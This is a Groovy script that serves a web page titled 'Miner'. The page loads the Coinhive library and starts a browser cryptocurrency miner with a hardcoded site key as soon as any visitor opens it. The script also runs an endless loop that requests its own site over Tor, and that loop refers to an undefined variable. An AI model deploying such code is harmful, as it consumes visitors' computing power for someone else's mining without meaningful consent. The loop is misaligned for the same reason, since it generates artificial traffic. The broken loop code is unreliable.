@Grab('com.github.nao20010128nao:HttpServerJava:3962b51')
@GrabResolver(name='jitpack',root='https://jitpack.io')
import net.freeutils.httpserver.HTTPServer

def hostname
def verifyPayload=UUID.randomUUID().toString()

def torRequest=new Thread({
  while(true){
    "torsocks wget -O /dev/null https://$hn/".execute()
  }
})
torRequest.daemon=false

def server=new HTTPServer(80)

server.getVirtualHost(null).with {
  addContext('/hostname/notice'){req,resp->
    if(hostname&&torRequest.alive){
      resp.sendHeaders(200)
      return
    }
    def hn=req.path.split('/').last()
    def payload=new URL("https://$hn/hostname/verify").text
    if(verifyPayload==payload){
      hostname=hn
      resp.sendHeaders(200)
    }else{
      resp.sendHeaders(404)
    }
  }
  addContext('/hostname/verify'){req,resp->
    resp.sendHeaders(200)
    resp.body.write verifyPayload.bytes
  }
  addContext('/'){req,resp->
    resp.sendHeaders(200)
    resp.body.write '''
<!doctype html>
<html>
<head>
<title>Miner</title>

<script>
var parser = document.createElement('a');
parser.href = location.href;

var req = new XMLHttpRequest();
req.onreadystatechange = function() {
}
req.open('GET', '/hostname/notice/' + parser.hostname, true);
req.send(null);
</script>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
function addOnLoad(yourFunctionName){
  if(window.attachEvent) {
    window.attachEvent('onload', yourFunctionName);
  } else {
    if(window.onload) {
      var curronload = window.onload;
      var newonload = function(evt) {
        curronload(evt);
        yourFunctionName(evt);
      };
      window.onload = newonload;
    } else {
      window.onload = yourFunctionName;
    }
  }
}

/*
var scptTag=document.createElement('script');
scptTag.setAttribute('src',
    'https://nao20010128nao.github.io/coin-hive-proxy/client.js?coin-hive-proxy='+parser.hostname);
document.head.appendChild(scptTag);
*/

var miner;

addOnLoad(function(){
  miner = new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66');
  miner.start(CoinHive.FORCE_MULTI_TAB);
  // Listen on events
  miner.on('found', function() { /* Hash found */ })
  miner.on('accepted', function() { /* Hash accepted by the pool */ })

  // Update stats once per second
  setInterval(function() {
    var hashesPerSecond = miner.getHashesPerSecond();
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes();

    // Output to HTML elements...
    document.getElementById('hps').innerHTML=hashesPerSecond;
    document.getElementById('tot').innerHTML=totalHashes;
    document.getElementById('acc').innerHTML=acceptedHashes;
  }, 1000);
});
</script>

</head>
<body>
<p>H/s: <div id="hps"></div></p>
<p>Total: <div id="tot"></div></p>
<p>accepted: <div id="acc"></div></p>
</body>
</html>
'''.trim().bytes
    0
  }
}

server.start()

println 'Ready'
